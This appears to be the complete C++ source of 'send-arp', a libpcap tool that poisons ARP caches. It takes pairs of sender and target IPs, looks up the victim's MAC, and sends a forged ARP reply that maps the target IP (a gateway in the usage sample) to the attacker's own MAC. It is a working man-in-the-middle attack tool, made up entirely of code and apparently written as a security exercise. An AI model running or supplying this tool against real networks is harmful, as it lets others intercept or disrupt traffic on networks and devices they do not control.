#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <errno.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int getIPAddress(uint32_t *ip_addr, char* dev) {
	int sock;
	struct ifreq ifr;
	struct sockaddr_in *sin;
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		return 0;
	}
	strcpy(ifr.ifr_name, dev);
	if (ioctl(sock, SIOCGIFADDR, &ifr)< 0) {
		close(sock);
		return 0;
	}
	sin = (struct sockaddr_in*)&ifr.ifr_addr;
	*ip_addr = htonl(sin->sin_addr.s_addr);
	close(sock);
	return 1;
}

int getMacAddress(uint8_t *mac, char* dev) {
	int sock;
	struct ifreq ifr;	
	char mac_adr[18] = {0,};		
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {		
		return 0;
	}	
	strcpy(ifr.ifr_name, dev);
	if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0) {
		close(sock);
		return 0;
	}
	for(int i=0; i<6; i++) {
		mac[i] = ((uint8_t*)ifr.ifr_hwaddr.sa_data)[i];
	}
	close(sock);
	return 1;
}

bool get_mac_addr(pcap_t* handle, EthArpPacket *packet, Mac smac, uint32_t sip, uint32_t tip, Mac* dest_mac) {
	packet->eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet->eth_.smac_ = smac;
	packet->eth_.type_ = htons(EthHdr::Arp);
	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	packet->arp_.op_ = htons(ArpHdr::Request);
	packet->arp_.smac_ = smac;
	packet->arp_.sip_ = htonl(Ip(sip));
	packet->arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet->arp_.tip_ = htonl(Ip(tip));
	
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return 0;
	}
	struct pcap_pkthdr* header;
	const u_char* p;
	while(true) {
		int res = pcap_next_ex(handle, &header, &p);
		if (res == 0) {
			continue;
		}
		if (res == -1 || res == -2) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return 0;
		}
		
		EthArpPacket* get_p = (EthArpPacket*)p;
		
		if(ntohs(get_p->arp_.op_) != ArpHdr::Reply || ntohl(get_p->arp_.sip_) != tip || ntohl(get_p->arp_.tip_) != sip){
			continue;
		}
		if(memcmp(((uint8_t*)(get_p->arp_.tmac_)), ((uint8_t*)smac), 6) != 0){
			continue;
		}
		*dest_mac = Mac(get_p->arp_.smac_); 
		break;
	}
	return 1;
}

int main(int argc, char* argv[]) {
	if (argc == 2 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	EthArpPacket packet;
	
	Mac target_mac;
	Mac sender_mac;
	uint32_t sender_ip;
	uint32_t target_ip;
	uint8_t mac_addr[6];
	uint32_t myIp;
	Mac myMac;
	
	getIPAddress(&myIp, dev);
	getMacAddress(mac_addr, dev);
	
	myMac = Mac(mac_addr);
	int cnt;
	
	for(cnt=2; cnt<argc; cnt+=2) {
		sender_ip = Ip((argv[cnt]));
		target_ip = Ip((argv[cnt+1]));
		
		if(get_mac_addr(handle ,&packet, myMac, myIp, sender_ip, &sender_mac) == 0){ 
			return 0;
		}
		
		packet.eth_.dmac_ = sender_mac;
		packet.eth_.smac_ = myMac;
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = myMac;
		packet.arp_.sip_ = htonl(Ip(target_ip));
		packet.arp_.tmac_ = sender_mac;
		packet.arp_.tip_ = htonl(Ip(sender_ip));
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return 0;
		}
	}
	pcap_close(handle);

}
